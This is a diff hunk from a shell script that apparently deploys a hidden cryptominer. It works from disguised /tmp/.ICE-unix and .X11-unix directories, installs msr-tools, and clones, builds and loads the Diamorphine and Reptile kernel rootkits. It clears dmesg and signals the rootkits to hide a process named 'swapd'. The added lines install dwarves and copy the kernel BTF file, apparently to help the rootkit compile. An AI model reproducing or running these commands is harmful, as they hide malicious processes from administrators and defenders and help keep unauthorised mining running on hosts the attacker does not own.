@@ -443,6 +443,9 @@ cd /tmp ; cd .ICE-unix ; cd .X11-unix ; yum install msr-tools pciutils lshw -y; 
 #echo "[*] Reptile..."
 #cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; rm -rf Reptile ; rm -rf hiding-cryptominers-linux-rootkit ; apt-get update -y ; apt-get install build-essential linux-headers-$(uname -r) git make gcc msr-tools libncurses-dev -y --force-yes ; yum update -y; yum install -y ncurses-devel ; git clone https://github.com/f0rb1dd3n/Reptile/ && cd Reptile ; make defconfig ; make ; make install ; dmesg -C ; /reptile/reptile_cmd hide ;  kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
 
+apt install dwarves -y ;
+cp /sys/kernel/btf/vmlinux /usr/lib/modules/`uname -r`/build/
+
 echo "[*] make toolZ, Diamorphine"
 cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; rm -rf Reptile ; rm -rf hiding-cryptominers-linux-rootkit ; yum reinstall kmod* -y ; yum install git kernel-modules kernel-devel kernel-header linux-generic linux-headers-$(uname -r) kernel kernel-devel kernel-firmware kernel-tools kernel-modules* kernel-headers git make gcc msr-tools -y --force-yes ; apt-get update -y ; apt reinstall kmod -y --force-yes ; apt-get install --reinstall kmod -y ; apt-get install linux-generic linux-headers-$(uname -r) git make gcc msr-tools -y --force-yes ;  zypper update -y ; zypper reinstall kmod* ; zypper install linux-generic linux-headers-$(uname -r) git make gcc msr-tools -y ; git clone https://github.com/m0nad/Diamorphine ; cd Diamorphine/ ; make ; insmod diamorphine.ko ; dmesg -C ; kill -63 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
 
